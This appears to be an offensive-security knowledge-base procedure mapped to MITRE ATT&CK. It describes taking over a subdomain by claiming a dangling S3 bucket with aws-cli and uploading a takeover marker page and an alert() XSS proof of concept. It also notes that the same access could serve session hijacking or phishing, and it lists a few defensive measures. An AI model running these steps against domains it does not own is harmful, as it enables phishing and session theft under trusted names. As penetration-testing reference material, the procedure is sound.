---
tags:
  - aws-s3
  - takeover
  - xss
  - malware-upload
type: procedure
tools:
  - '[[tools/aws-cli]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/aws-s3-create-bucket]]'
  - '[[commands/aws-s3-upload-file]]'
verified: false
platforms:
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:51:10.544Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: caf75b12-54a4-4d7b-ac38-cca0d1e0ccc9
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Claim S3 Bucket and Upload Malicious Content

## Summary

This procedure claims an unclaimed S3 bucket by creating it in the attacker's AWS account and uploading files like index.html and XSS PoCs to gain subdomain control.

## Description

Exploiting the dangling DNS, create a bucket with the exact name in US East 1, enable website hosting, and upload public-readable files. This allows serving arbitrary content, including XSS for session hijacking or phishing under the trusted domain.

## Requirements

1. AWS account with S3 permissions
2. AWS CLI installed and configured
3. Bucket name from DNS recon
4. Malicious files prepared (index.html, xss_poc.html)

## Defense

Defensive measures and detection strategies:

- Pre-claim all referenced S3 buckets during DNS setup
- Monitor AWS for unauthorized bucket creations with sensitive names
- Use AWS GuardDuty to detect anomalous S3 activity

## Objectives

1. Secure control over the subdomain
2. Host proof-of-concept malicious payloads
3. Demonstrate impact like XSS execution

## Instructions

### Step 1: Create the Bucket

**Context**: Initialize the S3 bucket in the correct region.

**Command** ([[commands/aws-s3-create-bucket]]):
```bash
aws s3 mb s3://bucket-name --region us-east-1
```

> Confirms bucket creation; must be in US East 1 for website endpoints.

### Step 2: Enable Website Hosting

**Context**: Configure for public HTTP access.

**Command**:
```bash
aws s3 website s3://bucket-name --index-document index.html
```

> Sets index.html as default; enables static hosting.

### Step 3: Upload Files

**Context**: Add takeover marker and XSS payload.

**Command** ([[commands/aws-s3-upload-file]]):
```bash
echo '<html><body><!-- Demonstrated subdomain takeover by attacker --></body></html>' > index.html
aws s3 cp index.html s3://bucket-name/ --acl public-read

echo '<script>alert("XSS PoC via takeover")</script>' > xss_poc_998877665544332211.html
aws s3 cp xss_poc_998877665544332211.html s3://bucket-name/ --acl public-read
```

> Files are public; verify with aws s3 ls.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/aws-s3-create-bucket]]
- [[commands/aws-s3-upload-file]]

## Tools Used

- [[tools/aws-cli]]

## Tags

- [[aws-s3]]
- [[takeover]]
